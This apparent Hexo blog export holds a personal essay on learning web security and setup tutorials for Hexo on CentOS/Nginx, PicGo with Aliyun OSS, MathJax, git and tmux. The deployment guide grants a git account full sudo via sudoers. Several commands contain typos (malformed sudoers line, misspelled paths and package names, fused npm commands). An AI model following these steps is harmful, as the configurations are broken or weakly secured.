<li><a href="/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Python反序列化漏洞</a></li>
</ul>
<h1 id="Java"><strong>Java</strong></h1>
<h2 id="Java基础">Java基础</h2>
<ul>
<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
<li><a href="/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3">Java基础学习之反射和注解</a></li>
<li><a href="/Java/code/6.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">Java基础学习之本地命令执行</a></li>
<li><a href="/Java/code/7.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">Java基础学习之动态代理</a></li>
<li><a href="/Java/code/8.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BRPC%E6%BC%94%E7%BB%83%E8%BF%87%E7%A8%8B">Java基础学习之RPC演练过程</a></li>
</ul>
<h2 id="Java安全">Java安全</h2>
<ul>
<li><a href="/Java/javasec/1.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84">Java安全学习之反射</a></li>
</ul>
<h1 id="算法"><strong>算法</strong></h1>
<h2 id="Leetcode">Leetcode</h2>
<ul>
<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
</ul>
<h1 id="随笔"><strong>随笔</strong></h1>
<h2 id="经验">经验</h2>
<ul>
<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
</ul>
<h2 id="技术">技术</h2>
<ul>
<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>从0到100分的路程——写在2019年的最后一天</title>
    <url>/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9/</url>
    <content><![CDATA[<h1 id="从0到100分的学习心得">从0到100分的学习心得</h1>
<p>大家好，我是ca01h，今年8月份加入了信安之路小白成长计划，5个月的时间过去，很意外地成为了群里第一个到达100分的男人。纸面上来看是0到100分的变化，而对我自己而言，意味着终于跨入了Web安全的领域，也算是融入了一个安全的圈子。与此同时，很荣幸接到良哥的邀请，为平台的其他小伙伴们写一写这几个月学习成长过程期间的经验之谈，刚好我也准备给自己做一个阶段性的总结以及对未来的短期规划，遂欣然接受。但真正到了提笔撰文的时候，除了兴奋之外亦有些惶恐，惶恐是因为感觉自己资质尚浅不足以支撑一篇经验贴，直白点就是太菜了，还有太多太多的知识面、技能表、奇技淫巧需要挖掘和学习，但既然已经答应了良哥，无论如何硬着头皮都要完成这个任务。当然，这篇文章也是面向平台的其他小伙伴们，望借拙笔浅文，与大家分享。</p>
<p>4个多月的时间100分，完成11个任务，平均下来每个任务得9分左右，也只能是中规中矩吧，不算优秀。现在回想起来，做前面几个任务的时候还没有摸到门道，是比较简单机械的搬运工，经过几个月的学习算是有点上道了，有了自己的实践操作，加上了自己对这个类型漏洞的理解和总结。到了后面经常两个星期才能完成一个报告，会在云服务器上自己搭建的漏洞环境因为某个问题而纠缠半天，也会为了大牛的博客上轻轻带过的一句话而深究背后的原理。是的，一篇报告不仅仅是时间堆砌出来的，更需要用心去书写和理解，用手去做实验得结果。就拿最近一篇关于SSRF漏洞的报告来说，我首先从《Web安全攻防》这本书出发，只有寥寥数页，比较粗略的讲了它的原理、可利用的地方以及简单的代码分析，看完之后意犹未尽感觉远远不够，于是Google找到了<a href="https://www.evi1.cn/post/ssrf/">一篇文章</a>，这个博文相对于书籍来说已经很充实了，漏洞的产生条件、利用方式、实际利用、Bypass等等都比较详细，对于我来说欣喜不已，遂认真品读起来，看完这篇文章确实给了我一个对于SSRF漏洞比较全面的认知。但实践出真知，到我真正去复现一些细节的时候，上面却没有提到太多，有的甚至一笔带过，但我肯定不能就此敷衍过去，又找了很多其他的资料，不断地扩充自己的报告的细节，解决问题的方法肯定不止一种，有的是用现成工具和命令来生成payload，而有的是自己截获流量经过一系列手段来构造payload。并不是说直接用工具不好，而是对自己的成长作用不大，可以作为参考，但绝非最优。当然，我自己还是觉得之前做的还是有些不足，比如缺少一些漏洞的实例，就拿SSRF来说，我最近看到一篇文章<a href="https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437">Vimeo upload function SSRF</a>，打算动手来试一试，也算是再一次加深印象和理解。总的来说，对于一个初学者而言，学习无非就是发现问题、查找问题、解决问题，最后的结果取决于这个过程，而这个过程又取决于你对它的态度。</p>
<p>上面简单的谈了一下这段时间我在写报告时候的一些感受和想法，既然作为分享，我就想分享的更为极致一些，接着说一说我自己目前学习期间的一些方法论。</p>
<p>首先，我认为需要一个知识库。现在是碎片化时代，生活中充斥着碎片化的时间、碎片化的内容、碎片化的知识等等，这让我们没有大段的专注时间，一种比较好的解决方式是体系化、文档化、数字化梳理和总结知识，管理学习，加深理解。比如我自己搭了一个简单的<a href="http://ca0y1h.top/">个人Wiki网站</a>，用来收录整理文章，分块管理，便于查阅温故。也并不是说非要搭建一个博客，网上也有很多可以分享记录的网站，总而言之，好记性不如烂笔头，文档化系统化是用来记录碎片化时间的所学所思最好的办法。</p>
<p>其次，计算机这门学科日益更新，信安尤其如此，虽然作为初学者，但我还是觉得要接触一些前沿的知识和新闻，这样才能在学习原理的时候能上手体验一下真实案例。我推荐几个我个人正在使用的信息源，一是腾讯玄武实验室和天融信阿尔法实验室，它们每天都会分享比较新比较优秀的文章，包括具体技术、最新漏洞、恶意代码、工具使用等等，上面提到的那篇关于Vimeo的SSRF上传漏洞就是前几天浏览看到的。我觉得这种形式还是很好的，也不用全盘接收，比较高效地获取知识，就看看是否有关于自己正在做的工作的文章或者感兴趣的知识点，记录下来。此外，大佬的博客也可以时常关注，比如说P牛、c0ny1、Knownsec、404 not found等等等，再此就不一一举例了。那么有的同学就会问，需要每天去他们的博客浏览一遍看有没有发新文章吗？其实也用不着，Chrome有一个扩展插件叫RSS Feed Reader用来整合RSS订阅，如果发布了新文章它就会有相应的提醒，很方便。</p>
<p>再者，CTF确实是学习Web安全的好途径。我在11月份的时候和很厉害的师兄一起参加了校赛NCTF，虽然被虐出翔了，这个经历回想起来也很心痛，但在打比赛的时候解出题目是学习新知识的最大动力，也是检验自己能力的一种方式。至于关于CTF方面，这里就不展开讲了，星球上也有很多关于CTF的文章，都可以参考参考。</p>
<p>这半年来的学习经验也差不多言尽于此了。现在想想自己为什么头铁两次考研非要选择这一行，反倒有些道不清原因了。本科的时候也是做信安的，不过更多的是放在了Linux系统内核安全加固方面，也做出了些东西顺带拿了个国奖。可能是感觉底层这一块还是不太适合我，有些力不从心了，或者觉得这个方向的就业面太窄了，当时恰好有一位学长是搞web安全的，在我面前演示了一把拿到某个后台系统管理员权限，看着他打了几场CTF比赛，也许真的是兴趣使然，恰好到了考研的准备的阶段，于是就下定决心读研转Web安全方向。虽然有些坎坷，现在也算是坐在这个位置上了，但也正是到了更高的平台上，才发现自己入行太晚了。相比而言，学弟学妹们大一大二就入了门，优秀一点的都已经拿了不少线下攻防大赛的一等奖、第一名，暑假去大厂实习。像我这种大龄选手已经没法比了，自己在学习的时候别人也在学，唯一的选择就是花更多的时间，下更大的功夫。讲真，虽说遗憾，但也无悔。</p>
<p>说到这里，一般都到了立flag的时间，我也不例外，明天就是2020年了，新的一年做个短期规划也是挺不错的。对于Web安全这条路，我加入之前这个平台之前，也很想学Web安全，也在各大论坛看了不少的经验贴，但说到底还是别人的经验，我不知道我要学什么，目标是什么，怎么样走下去，这些都非常地困惑我。现在，我会继续跟着良哥的计划走，在年底之前完成web安全的剩余任务，同时开启渗透测试的新篇章，以某个SRC为目标体验渗透的过程。在此期间，我也会在前期试着看一些现有的教程玩一玩Hack the box靶机，毕竟在当前的法律法规面前，打靶机还是不错的选择。另外还有更重要的一条路线就是漏洞挖掘（也有可能是代码审计）+机器学习，毕竟是要出论文的，单独一个Web安全写不出什么太多的花样，希望自己能结合当前比较火热的ML、DL等作为自己日后的研究方向，目前在看吴恩达老师的机器学习课程，学完了基础知识再去研究具体的工作。要是哪位大佬正在搞这个，希望能带带小弟共同交流。</p>
<p>好了，文章的最后，就用一句话与小伙伴们共勉：学习之路，道阻且长，上下求索。</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云Centos7+Ngnix部署Hexo</title>
    <url>/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo/</url>
    <content><![CDATA[<h1 id="阿里云Centos7-Ngnix部署Hexo">阿里云Centos7+Ngnix部署Hexo</h1>
<p>之前一直把hexo部署在GitHub Page上，缺点就是访问的速度慢，有时候甚至加载不出来，刚好之前买的阿里云ECS也落灰了，顺手把hexo部署在阿里云上，再顺手记录一下部署过程。</p>
<h3 id="部署环境">部署环境</h3>
<ul>
<li>本地环境：
<ul>
<li>Window10（64bit）</li>
<li>Git</li>
<li>NodeJS</li>
<li>Hexo</li>
</ul>
</li>
<li>云主机环境
<ul>
<li>Centos7</li>
<li>Nginx</li>
</ul>
</li>
<li>其他
<ul>
<li>宝塔面板</li>
</ul>
</li>
</ul>
<h3 id="开始部署">开始部署</h3>
<h4 id="生成ssh公钥">生成ssh公钥</h4>
<blockquote>
<p>如果本机已有<code>id_rsa.pub</code>文件，此步骤可跳过</p>
</blockquote>
<p>在Win10桌面右击，点击Git Bash Here打开命令行终端，执行如下命令（直接按三次回车生成密钥）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>生成的文件默认在<code>C:/用户/本机用户名/.ssh/</code>路径下。</p>
<h4 id="Centos搭建环境">Centos搭建环境</h4>
<h5 id="安装Git">安装Git</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install git</span><br></pre></td></tr></table></figure>
<h5 id="创建Git账户">创建Git账户</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>
<h5 id="添加账户权限">添加账户权限</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>找到下面这一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Allow root to run any commands anywhere</span></span><br><span class="line">root    ALL=(ALL)     ALL</span><br></pre></td></tr></table></figure>
<p>紧接着添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git     ALL(ALL)      ALL</span><br></pre></td></tr></table></figure>
<h5 id="设置Git账户密码">设置Git账户密码</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<h5 id="复制公钥">复制公钥</h5>
<p>切换至git用户，创建<code>./ssh</code>文件夹和``~/.ssh/authorized_keys `文件，并给权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~/.ssh/authorized_keys</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后将win10中生成的id_rsa.pub文件中的公钥复制到authorized_keys</span></span><br><span class="line">chmod 600 /home/git/.ssh/authorzied_keys</span><br><span class="line">chmod 700 /home/git/.ssh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在本地Git终端中测试是否能免密登录git，其中SERVER为填写自己的云主机IP，执行输入yes后不用密码就说明好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="创建本地仓库和网站根目录">创建本地仓库和网站根目录</h5>
<p>首先创建目录并给权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">repo作为为Git仓库目录</span></span><br><span class="line">mkdir /var/repo</span><br><span class="line">chown -R git:git /var/repo</span><br><span class="line">chmod -R 755 /var/repo</span><br><span class="line"><span class="meta">#</span><span class="bash">hexo作为网站根目录</span></span><br><span class="line">mkdir /var/www/hexo</span><br><span class="line">chown -R git:git /var/www/hexo</span><br><span class="line">chmod -R 755 /var/www/hexo</span><br></pre></td></tr></table></figure>
<p>然后创建一个Git仓库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd var/repo</span><br><span class="line">git init --bare hexoBlog.git</span><br></pre></td></tr></table></figure>
<h5 id="自动部署">自动部署</h5>
<p>在 <code>/var/repo/hexoBlog.git</code>下，有一个自动生成的<code>hooks</code>文件夹。我们需要在里边新建一个新的钩子文件<code>post-receive</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>
<p>添加一下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/var/repo/hexoBlog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>修改文件权限，使得其可执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R git:git /var/repo/hexoBlog.git/hooks/post-receive</span><br><span class="line">chmod +x /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>
<h4 id="Centos配置Nginx">Centos配置Nginx</h4>
<p>为了适合小白安装部署和后期网站服务器的扩展性，选用宝塔面板来一键部署Nginx。宝塔面板的安装和使用可以查看<a href="http://www.bt.cn/bbs">官方文档</a>。</p>
<p>Nginx部署成功后就可以创建网站了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191024132801.png" alt=""></p>
<blockquote>
<p>没有域名的可以填写IP地址。</p>
</blockquote>
<p><strong>注意：根目录的路径必须是你上一步在云服务器上创建的网站目录。</strong></p>
<h3 id="本地Hexo配置">本地Hexo配置</h3>
<p>配置_config.yml,完成自动化部署。</p>
<p>打开blog文件夹，编辑_config.yml，找到deploy：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line">  <span class="symbol">type:</span> git</span><br><span class="line">  <span class="comment">#server改为你的服务IP地址或解析后的域名</span></span><br><span class="line">  <span class="comment">#例如我改为repo: git<span class="doctag">@ali</span>6.cn:/var/repo/blog.git</span></span><br><span class="line">  <span class="symbol">repo:</span> git@server<span class="symbol">:/var/repo/hexoBlog</span>.git</span><br><span class="line">  <span class="symbol">branch:</span> master</span><br></pre></td></tr></table></figure>
<p>再执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>
<p>不出错显绿说明完成，打开浏览器输入你的域名或ip地址就可以看到你部署的Hexo博客了。</p>
]]></content>
      <categories>
        <category>技术随笔</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云OSS+PicGo搭建Markdown图床</title>
    <url>/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h1 id="阿里云OSS-PicGo搭建Markdown图床">阿里云OSS+PicGo搭建Markdown图床</h1>
<p>用一个图床崩一个，实在是不能忍了，一怒之下决定用阿里云OSS来搭建一个图床，稳定又方便~</p>
<p>步骤：</p>
<ol>
<li>购买<code>阿里云OSS</code>，40G存储空间9元/年（流量费用另算）</li>
<li>创建OSS专用<code>用户</code>，专门用于访问OSS，注意保存<code>AccessKey</code>和<code>AccessKeySecret</code></li>
<li>下载阿里官方的<code>OSS Browser</code>管理客户端，并配置连接信息</li>
<li>创建Bucket，注意权限设置为<code>公共读</code></li>
<li>在<code>GitHub</code>下载<code>PicGo</code>客户端并安装配置</li>
</ol>
<h2 id="购买阿里云OSS">购买阿里云OSS</h2>
<p>价格：</p>
<blockquote>
<p>40G 9元/年</p>
<p>100G 99元/年</p>
<p>500G 486元/年</p>
<p>1T 999元/年</p>
</blockquote>
<p>到阿里云官网找OSS入口即可：</p>
<p><a href="https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8">https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8</a></p>
<h2 id="创建专用用户（可选）">创建专用用户（可选）</h2>
<p>进入控制台后，鼠标悬浮在右上角的用户头像，选择<code>访问控制</code></p>
<p>然后在左侧：人员管理-&gt;用户：新建用户</p>
<p>输入<code>登录名称</code>和<code>显示名称</code>，点击<code>确认</code>按钮，要求手机验证码。</p>
<p>创建成功后，点击返回，然后回到用户列表。</p>
<p>点击进入刚刚创建的用户，选择<code>权限管理</code>，点击<code>添加权限</code>，搜索<code>AliyunOSSFullAccess</code>，添加，确认。</p>
<p>选择<code>认证管理</code>，点击最下面的<code>创建新的AccessKey</code>，会生成<code>AccessKeyID</code>和<code>AccessKeySecret</code>，<code>AccessKeySecret</code>是无法找回的，所以一定要保存好。</p>
<h2 id="创建Bucket">创建Bucket</h2>
<p>进入OSS控制台：<a href="https://oss.console.aliyun.com/overview">https://oss.console.aliyun.com/overview</a></p>
<p>点击加号，创建Bucket。</p>
<p><strong>注意：</strong></p>
<blockquote>
<ol>
<li>Bucket名称要全局唯一</li>
<li>区域最好选择离你近的</li>
<li>权限选择公共读，这样子图片别人才能访问得到</li>
</ol>
</blockquote>
<h2 id="安装OSS-Browser客户端">安装OSS Browser客户端</h2>
<p>OSS Browser是阿里云官方的客户端工具，可以使用拥有OSS权限的用户登录，从而免去登录官网控制台的麻烦。</p>
<ul>
<li><code>OSS Browser</code> Windows64下载地址：</li>
</ul>
<blockquote>
<p><a href="http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip">http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip</a></p>
</blockquote>
<ul>
<li>OSS常用工具汇总：</li>
</ul>
<blockquote>
<p><a href="https://help.aliyun.com/document_detail/44075.html">https://help.aliyun.com/document_detail/44075.html</a></p>
</blockquote>
<p>安装完成之后，输入<code>AccessKey</code>、<code>AccessKeySecret</code>登录即可，其他都是可选项。</p>
<p>可以新建Bucket、上传文件、上传文件夹等等。</p>
<h2 id="安装PicGo">安装PicGo</h2>
<p>PicGo是一个支持多种图床的客户端图片上传工具，可以实现快速上传图片到指定图床，并将链接保存到剪贴板。</p>
<ul>
<li>GitHub地址：</li>
</ul>
<blockquote>
<p><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
</blockquote>
<ul>
<li>Release地址：</li>
</ul>
<blockquote>
<p><a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p>
</blockquote>
<p>Windows的下载<a href="https://github.com/Molunerfinn/PicGo/releases/download/v2.1.2/picgo-setup-2.1.2.exe">picgo-setup-2.1.2.exe</a>下载安装即可</p>
<p>设置参考图片即可：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191018221456.png" alt=""></p>
<blockquote>
<p><strong>这里最坑的地方就在于<code>确定存储区域</code>这一项，并不是OSS控制台中的<code>Endpoint</code>外网访问的全部地址，而是<code>.aliyuncs.com</code>前面的值！！！</strong></p>
</blockquote>
<p>设定自定义域名后，生成的链接会自动用自定义的域名替换。</p>
<p>当使用截图工具截图后，会保存到剪贴板，这时按下快捷键，PicGo就会自动上传图片，然后将指定格式的链接地址放到剪贴板，直接粘贴到Markdown文档即可。</p>
<p>点击右上角的➕，会变成浮窗，将图片直接拖到浮窗就能上传。</p>
]]></content>
      <categories>
        <category>技术随笔</category>
      </categories>
      <tags>
        <tag>OSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo渲染LaTeX数学公式</title>
    <url>/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Hexo渲染LaTeX数学公式">Hexo渲染LaTeX数学公式</h1>
<p>最近在跟着吴恩达教授在Coursera网站上的课程学习机器学习，其中涉及到的公式比多，包括线性代数和微分。这里基于 Hexo 介绍如何在博客上进行 LaTeX 公式的编写和渲染。</p>
<h3 id="在-Hexo-中配置-MathJax">在 Hexo 中配置 MathJax</h3>
<h4 id="环境配置">环境配置</h4>
<p>Hexo 中对网页进行渲染的 marked 并不支持 mathjax，我们用 Git Bash 进入博客工程所在的文件夹下并执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --savenpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<h4 id="停止-hexo-math">停止 hexo-math</h4>
<p>卸载可能安装的 <code>hexo-math</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-math --save</span><br></pre></td></tr></table></figure>
<p>再安装 <code>hexo-renderer-mathjax</code> 包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-rederer-mathjax</span><br></pre></td></tr></table></figure>
<h4 id="更新-mathjax-的-CDN-连接">更新 mathjax 的 CDN 连接</h4>
<p>按照 <code>node_modules</code> →→ <code>hexo-renderer-mathjax</code> 的顺序进入目录，对 <code>mathjax.html</code> 文档进行修改，把 `` 改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;mathjax&#x2F;2.7.1&#x2F;MathJax.js?config&#x3D;TeX-MML-AM_CHTML&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="更改默认的转义规则">更改默认的转义规则</h4>
<p>因为 Hexo 在处理特殊字符时会对某些字符转为 html 中的网页标签，我们按照 <code>node_modules</code> →→ <code>kramed</code> →→ <code>lib</code> →→ <code>rules</code> 的顺序进入目录并修改 <code>inline.js</code> ，将其中的两行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>对应修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<h4 id="开启-mathjax">开启 mathjax</h4>
<p>进入工程目录的主题文件夹下，找到 <code>_config.yml</code> 文件并开启 mathjax：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: 	</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>在我们每一次使用 <code>Git Bash</code> 创建博客文章后，Hexo 都会自动为我们生成头部信息，我们在需要插入 LaTeX 公式的博客的头部加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>这样我们就可以在博客中编写数学公式了。</p>
]]></content>
      <categories>
        <category>技术随笔</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>git常用命令思维导图</title>
    <url>/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="Git-Sheatcheat">Git Sheatcheat</h1>
<p>——搬运自https://www.zhihu.com/answer/975066538</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/git.jpg" alt=""></p>
]]></content>
      <categories>
        <category>技术随笔</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmux快捷键备忘录</title>
    <url>/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="Tmux-Cheatsheet">Tmux Cheatsheet</h1>
<p>oh-my-tmux：<a href="https://github.com/gpakosz/.tmux">https://github.com/gpakosz/.tmux</a></p>
<ul>
<li><code>&lt;prefix&gt;</code> = Ctrl + a 或 Ctrl + b</li>
<li><code>&lt;prefix&gt; c</code> =  Ctrl + a (or Ctrl + b)  + c</li>
<li><code>&lt;prefix&gt; C-c</code> = Ctrl + a (or Ctrl + b) Ctrl + c</li>
</ul>
<p>tmux命令：</p>
<ul>
<li><code>tmux detach</code> 或 <code>&lt;preifx&gt; d</code> 分离当前session</li>
<li><code>tmux ls</code> 查看所有session</li>
<li><code>tmux attach -t 0</code> 根据session id接入某个session</li>
<li><code>tmux kill-session -t 0</code> 根据session id杀死某个session</li>
</ul>
<p>tmux快捷键：</p>
<ul>
<li><code>&lt;prefix&gt; e</code> 修改<code>~/.tmux.conf.local</code></li>
<li><code>&lt;prefix&gt; r</code> 重新载入配置文件</li>
<li><code>&lt;prefix&gt; C-l</code> clears both the screen and the tmux history</li>
<li><code>&lt;prefix&gt; C-c</code> 新建session</li>
<li><code>&lt;prefix&gt; C-f</code> 根据session_name切换session</li>
<li><code>&lt;prefix&gt; s</code> 列出所有session</li>
<li><code>&lt;prefix&gt; c</code> 新建window</li>
<li><code>&lt;prefix&gt; C-h</code> and <code>&lt;prefix&gt; C-l</code> 向前、向后切换window</li>
<li><code>&lt;prefix&gt; Tab</code> 切换上一个活动window</li>
<li><code>&lt;prefix&gt; |</code> 垂直分割panes</li>
<li><code>&lt;prefix&gt; _</code> 水平分割panes</li>
<li><code>&lt;prefix&gt; h</code>, <code>&lt;prefix&gt; j</code>, <code>&lt;prefix&gt; k</code> and <code>&lt;prefix&gt; l</code> 光标切换到其他panes，类似Vim</li>
<li><code>&lt;prefix&gt; H</code>, <code>&lt;prefix&gt; J</code>, <code>&lt;prefix&gt; K</code>, <code>&lt;prefix&gt; L</code> let you resize panes</li>
<li><code>&lt;prefix&gt; &lt;</code> and <code>&lt;prefix&gt; &gt;</code> 交换panes位置</li>
<li><code>&lt;prefix&gt; +</code> 当前panes全屏显示，再使用一次会变回原来大小</li>
<li><code>&lt;prefix&gt; m</code> 是否启用鼠标模式</li>
<li><code>&lt;prefix&gt; U</code> launches Urlview (if available)</li>
<li><code>&lt;prefix&gt; F</code> launches Facebook PathPicker (if available)</li>
<li><code>&lt;prefix&gt; Enter</code> 进入复制模式</li>
<li><code>&lt;prefix&gt; b</code> 列出剪切板中的内容</li>
<li><code>&lt;prefix&gt; p</code> 粘贴剪切板中的第一条内容</li>
<li><code>&lt;prefix&gt; P</code> 从剪切板中选择内容粘贴</li>
</ul>
]]></content>
      <categories>
        <category>技术随笔</category>
